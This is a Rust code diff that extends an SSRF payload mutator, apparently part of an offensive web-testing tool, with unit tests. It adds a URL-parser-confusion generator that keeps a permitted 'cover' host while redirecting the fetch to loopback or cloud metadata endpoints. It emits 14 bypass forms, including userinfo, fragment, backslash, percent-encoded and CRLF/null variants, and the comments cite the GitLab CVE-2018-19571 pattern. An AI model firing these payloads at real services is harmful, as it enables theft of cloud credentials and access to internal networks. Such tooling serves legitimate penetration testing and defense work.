@@ -182,6 +182,47 @@ pub fn mutate(payload: &str) -> Vec<String> {
         add_with_suffix(&mut results, scheme, oob_domain, suffix);
     }
 
+    // ── Parser-confusion authority family (Orange Tsai 2017) ─────────
+    // The Tsai class: the user's *allowed* host is preserved as cover,
+    // but the URL is rewritten so the validator parser sees the cover
+    // host and the fetcher parser hits an internal target. Every
+    // language URL parser disagrees on at least one of these patterns
+    // (CPython urllib, Ruby URI, Go net/url, Java URL, libcurl,
+    // PHP parse_url all return different hosts for the same string).
+    //
+    // We use the user's input host as the cover and rotate metadata /
+    // loopback hosts as the real SSRF target. This covers the GitLab
+    // CVE-2018-19571 pattern, the Uber $20k SSRF, and the pre-2022
+    // ProxyShell-class authority confusion.
+    let cover_host = strip_scheme(payload)
+        .split('/')
+        .next()
+        .unwrap_or("")
+        .split('?')
+        .next()
+        .unwrap_or("")
+        .split('#')
+        .next()
+        .unwrap_or("")
+        .to_string();
+    if !cover_host.is_empty() && cover_host.len() <= 253 {
+        let path_suffix = extract_path(payload)
+            .map(|i| payload[i..].to_string())
+            .unwrap_or_else(|| "/".to_string());
+        for target in [
+            "127.0.0.1",
+            "localhost",
+            "169.254.169.254", // AWS / DO / Azure metadata
+            "metadata.google.internal",
+            "100.100.100.200", // Alibaba
+            "0.0.0.0",
+        ] {
+            for variant in parser_confusion_authority(scheme, &cover_host, target, &path_suffix) {
+                results.insert(variant);
+            }
+        }
+    }
+
     // ── Scheme-mangling for naxsi-class WAFs ─────────────────────────
     // naxsi blocks `http://<IP>` as a unit. The following alt-forms
     // pass cleanly while most URL parsers (Python urllib3, Java URL,
@@ -219,6 +260,51 @@ pub fn mutate(payload: &str) -> Vec<String> {
 
     results.remove(payload);
     results.into_iter().collect()
+}
+
+/// Generate URL-parser-confusion variants where `cover` looks like the
+/// authoritative host to a naive validator but `target` is the real
+/// destination after parsing.
+///
+/// Each row exploits a specific parser disagreement that has been
+/// observed in production (CVE / bounty references in the inline
+/// comments). Returned strings are full URLs ready to drop into the
+/// payload set.
+fn parser_confusion_authority(
+    scheme: &str,
+    cover: &str,
+    target: &str,
+    path_suffix: &str,
+) -> Vec<String> {
+    let p = if path_suffix.is_empty() { "/" } else { path_suffix };
+    vec![
+        // Classic userinfo: validator parses host=cover, fetcher hits target.
+        format!("{scheme}{cover}@{target}{p}"),
+        // Fragment-userinfo (CVE-2018-19571 GitLab): Ruby URI sees cover,
+        // Net::HTTP sees target.
+        format!("{scheme}{cover}#@{target}{p}"),
+        // Tsai canonical: arbitrary chars between cover and `@target`.
+        format!("{scheme}{cover} &@{target}{p}"),
+        format!("{scheme}{cover}\t@{target}{p}"),
+        // Port-then-userinfo: some parsers stop at first `:`, some at first `@`.
+        format!("{scheme}{cover}:80@{target}{p}"),
+        // Backslash-userinfo (Java/.NET treat \ as path; libcurl/Python don't).
+        format!("{scheme}{cover}\\@{target}{p}"),
+        format!("{scheme}{cover}\\\\@{target}{p}"),
+        // Percent-encoded `@`: WAF often decodes once, fetcher decodes twice.
+        format!("{scheme}{cover}%40{target}{p}"),
+        format!("{scheme}{cover}%2540{target}{p}"),
+        // Query-then-userinfo: some parsers treat `?` as authority terminator,
+        // some don't.
+        format!("{scheme}{cover}?@{target}{p}"),
+        // Path-relative jump (frontend strips, backend honors).
+        format!("{scheme}{cover}/@{target}{p}"),
+        format!("{scheme}{cover}//{target}{p}"),
+        // Newline / CR injection inside authority — some parsers truncate,
+        // some pass through.
+        format!("{scheme}{cover}%0d%0a@{target}{p}"),
+        format!("{scheme}{cover}%00@{target}{p}"),
+    ]
 }
 
 /// Strip a leading `scheme://` (or `scheme:/`, `scheme:///`) from a URL.
@@ -595,5 +681,80 @@ mod tests {
     #[test]
     fn non_ssrf_payload_returns_empty() {
         assert!(mutate("hello world").is_empty());
+    }
+
+    // ── Parser-confusion authority family (Tsai class) ────────────────
+
+    #[test]
+    fn parser_confusion_basic_userinfo() {
+        let v = parser_confusion_authority("https://", "allowed.com", "127.0.0.1", "/admin");
+        assert!(
+            v.iter().any(|s| s == "https://allowed.com@127.0.0.1/admin"),
+            "missing classic userinfo bypass: {v:?}"
+        );
+    }
+
+    #[test]
+    fn parser_confusion_gitlab_fragment_pattern() {
+        // CVE-2018-19571 — Ruby URI sees allowed.com, Net::HTTP sees 127.0.0.1.
+        let v = parser_confusion_authority("http://", "google.com", "127.0.0.1", "/");
+        assert!(
+            v.iter().any(|s| s == "http://google.com#@127.0.0.1/"),
+            "missing GitLab CVE pattern: {v:?}"
+        );
+    }
+
+    #[test]
+    fn parser_confusion_metadata_target() {
+        // Real money-shot: cover host is anything internal, target is AWS metadata.
+        let v = parser_confusion_authority(
+            "http://",
+            "api.victim.com",
+            "169.254.169.254",
+            "/latest/meta-data/",
+        );
+        assert!(v.iter().any(|s| s.contains("169.254.169.254")
+            && s.contains("api.victim.com")
+            && s.contains("/latest/meta-data/")));
+    }
+
+    #[test]
+    fn mutate_includes_parser_confusion_family_for_user_url() {
+        // User passes a real URL — output should include parser-confusion
+        // forms that PRESERVE the user's host as cover and rotate
+        // metadata/loopback targets through the userinfo position.
+        let out = mutate("https://api.example.com/v1/fetch");
+        assert!(
+            out.iter()
+                .any(|s| s.starts_with("https://api.example.com") && s.contains("@127.0.0.1")),
+            "no api.example.com@127.0.0.1 variant; got {} entries",
+            out.len()
+        );
+        assert!(
+            out.iter()
+                .any(|s| s.contains("api.example.com#@169.254.169.254")),
+            "no metadata-via-fragment variant; got {} entries",
+            out.len()
+        );
+        assert!(
+            out.iter()
+                .any(|s| s.contains("api.example.com\\@127.0.0.1")
+                    || s.contains("api.example.com\\\\@127.0.0.1")),
+            "no backslash-confusion variant; got {} entries",
+            out.len()
+        );
+    }
+
+    #[test]
+    fn parser_confusion_targets_cover_all_six_tsai_classes() {
+        // Each row in parser_confusion_authority targets a specific
+        // parser-disagreement. Lock the count so a future edit doesn't
+        // silently drop a class.
+        let v = parser_confusion_authority("http://", "host.tld", "internal", "/p");
+        assert_eq!(
+            v.len(),
+            14,
+            "parser_confusion_authority lost a Tsai variant: {v:?}"
+        );
     }
 }
